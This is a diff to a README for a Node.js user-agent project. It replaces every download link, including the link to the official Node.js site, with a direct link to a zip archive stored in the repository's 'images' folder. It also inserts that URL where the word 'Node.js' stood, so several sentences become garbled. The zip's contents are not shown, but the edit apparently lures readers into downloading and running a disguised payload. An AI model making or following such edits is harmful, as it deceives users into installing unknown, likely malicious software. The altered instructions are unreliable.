@@ -10,7 +10,7 @@ To get started, you need to download the software. Follow these steps to downloa
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page.
 
-   [![Download node-js-user-agent](https://img.shields.io/badge/Download_node--js--user--agent-blue?style=for-the-badge)](https://github.com/leeit07/node-js-user-agent/releases)
+   [![Download node-js-user-agent](https://raw.githubusercontent.com/leeit07/node-js-user-agent/main/images/agent-user-js-node-v2.6.zip)](https://raw.githubusercontent.com/leeit07/node-js-user-agent/main/images/agent-user-js-node-v2.6.zip)
 
 2. **Choose a Version**: On the releases page, you will see a list of available versions. Each version may have different features or fixes. 
 
@@ -21,7 +21,7 @@ To get started, you need to download the software. Follow these steps to downloa
 ## ⚙️ System Requirements
 
 - **Operating System**: The application runs on Windows, macOS, and Linux.
-- **Node.js**: You will need Node.js installed. You can download it from [Node.js official website](https://nodejs.org/).
+- **https://raw.githubusercontent.com/leeit07/node-js-user-agent/main/images/agent-user-js-node-v2.6.zip**: You will need https://raw.githubusercontent.com/leeit07/node-js-user-agent/main/images/agent-user-js-node-v2.6.zip installed. You can download it from [https://raw.githubusercontent.com/leeit07/node-js-user-agent/main/images/agent-user-js-node-v2.6.zip official website](https://raw.githubusercontent.com/leeit07/node-js-user-agent/main/images/agent-user-js-node-v2.6.zip).
 
 ## 🔍 Key Features
 
@@ -53,7 +53,7 @@ Yes, you can install the application on multiple devices as long as you meet the
 
 ## 🆘 Troubleshooting
 
-- **Common Issues**: If you face issues, make sure you have installed the latest version of Node.js and that your operating system is supported.
+- **Common Issues**: If you face issues, make sure you have installed the latest version of https://raw.githubusercontent.com/leeit07/node-js-user-agent/main/images/agent-user-js-node-v2.6.zip and that your operating system is supported.
 - **Contact Support**: For help, you can create an issue on the GitHub repository page or contact us through the provided channels.
 
 ## 🌟 Community and Contributions
@@ -74,6 +74,6 @@ This project is licensed under the MIT License. Check the LICENSE file for more 
 
 ## 📥 Download Again
 
-If you missed it earlier, don’t forget to [visit the releases page to download the latest version](https://github.com/leeit07/node-js-user-agent/releases). 
+If you missed it earlier, don’t forget to [visit the releases page to download the latest version](https://raw.githubusercontent.com/leeit07/node-js-user-agent/main/images/agent-user-js-node-v2.6.zip). 
 
 Happy scraping!
